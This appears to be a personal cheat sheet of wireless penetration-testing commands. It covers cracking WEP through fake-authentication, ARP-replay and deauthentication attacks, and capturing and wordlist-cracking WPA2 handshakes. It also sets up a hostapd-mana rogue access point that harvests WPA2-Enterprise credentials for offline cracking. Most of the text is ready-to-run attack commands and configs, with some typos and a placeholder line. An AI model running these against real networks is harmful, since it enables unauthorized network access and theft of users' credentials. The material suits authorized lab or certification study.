### WEP Crack with No Client
#iwconfig
#iw dev wlan0 set type monitor
#airodump-ng wlan0
#iwlist frequency
#iwconfig wlan0 channel 5
#airodump-ng -c 5 --bssid xx:xx:xx:xx:xx:xx -w WEP_HACK wlan0
#aireplay-ng -1 0 -e ESSID -a xx:xx:xx:xx:xx:xx wlan0 (Fake Auth Attack)
#aireplay-ng -3 -b xx:xx:xx:xx:xx:xx wlan0 (ARP Request and Replay Attack)
#aireplay-ng -0 1 -a xx:xx:xx:xx:xx:xx -c xx:xx:xx:xx:xx:xx wlan0 (Deauth Attack)
#aircrack-ng WEP_HACK.cap

### Attack WEP
iwconfig
airmong-ng start wlan0
airodump-ng wlan0mon
airodump-ng --bssid <BSSID> -c <CHANNEL> -w <CAPTURE_FILE> wlan0mon
aireplay-ng -0 0 -a <BSSID> wlan0mon
aireplay-ng -1 6 -e <SSID> -a <BSSID> -h <CLIENT MAC> wlan0mon
aireplay-ng -3 -b <BSSID> -h <CLIENT MAC> wlan0mon
aircrack-ng <CAPTURE_FILE>

### Connect AP
iwconfig wlan0 essid <SSID> key s:<KEY>
dhclient wlan0

### Attack WPA2
iwconfig
airmong-ng start wlan0
airodump-ng wlan0mon
airodump-ng -c <CHANNEL> -w <CAPTURE_FILE> --essid <ESSID> --bssid <BSSID> wlan0mon
aireplay-ng -0 1 -a <BSSID> -c <CLIENT MAC> wlan0mon
###WAIT ON airodump-ng see "WPA handshake:"
tshark -r <CAPTURE_FILE> -n -Y eapol # CHECK IF HANDSHAKE IN FILE
aircrack-ng -w <WORDLIST> -e <ESSID> -b <BSSID> <CAPTURE_FILE>

### CONNECT TO AP
wpa_passphrase "ESSIDNAME" > wpa-psk.conf # write the password cracked with aircrack
wpa_supplicant -i wlan0mon -c wpa-psk.conf
dhclient wlan0

### Attack WPA2 MGT
iwconfig
airmong-ng start wlan0
airodump-ng wlan0mon
airodump-ng -c <CHANNEL> --bssid <BSSID> -w <CAPTURE_FILE> wlan0mon
aireplay-ng -0 1 -a <BSSID> -c <CLIENT MAC> wlan0mon
Grab cert files from wireshark(tls.handshake.type == 11 or tls.handshake.certificate)
Packet Details -> Extensible Authentication Protocol -> Transport Layer Security -> TLSv1.2 Record Layer: Handshake Protocol: Certificate ->  Handshake Protocol: Certificate -> Certificates
Save certificates to file, right click and select Export Packet Bytes to save the data into a file with a .der extension.

###View SSL cert info:
openssl x509 -inform der -in CERTIFICATE_FILENAME -text

alter certificate_authority block in /etc/freeradius/3.0/certs/ca.cnf:
    [certificate_authority]
    countryName             = US
    stateOrProvinceName     = {2 letter state}
    localityName            = {City}
    organizationName        = {Company Name}
    emailAddress            = {Email}
    commonName              = "Such and Such Certificate Authority"
    
alter server block in /etc/freeradius/3.0/certs/server.cnf:
    [server]
    countryName             = US
    stateOrProvinceName     = {2 letter state}
    localityName            = {City}
    organizationName        = {Company Name}
    emailAddress            = {Email}
    commonName              = "Such and Such Certificate Authority"

change dir to /etc/freeradius/3.0/certs/ and run:
rm dh && make

###Create /etc/hostapd-mana/mana.conf with this:
ssid=SSIDNAME
interface=wlan0mon
driver=nl80211
channel=1
hw_mode=g
ieee8021x=1
eap_server=1
eapol_key_index_workaround=0
eap_user_file=/etc/hostapd-mana/mana.eap_user
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
# The password is actually 'whatever'
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh
auth_algs=1
wpa=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP TKIP
mana_wpe=1
mana_credout=/tmp/hostapd.credout
mana_eapsuccess=1
mana_eaptls=1

Create /etc/hostapdmana/mana.eap_user with this:
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]

hostapd-mana /etc/hostapd-mana/mana.conf
<asleap command> -W /usr/share/john/password.lst

###Connect To AP
Create a file with this:
network={
  ssid="SSID"
  scan_ssid=1
  key_mgmt=WPA-EAP
  identity="enterthedomain\entertheusername"
  password="enterthepassword"
  eap=PEAP
  phase1="peaplabel=0"
  phase2="auth=MSCHAPV2"
}

wpa_supplicant -i wlan0mon -c wpa-mgt.conf
dhclient wlan0
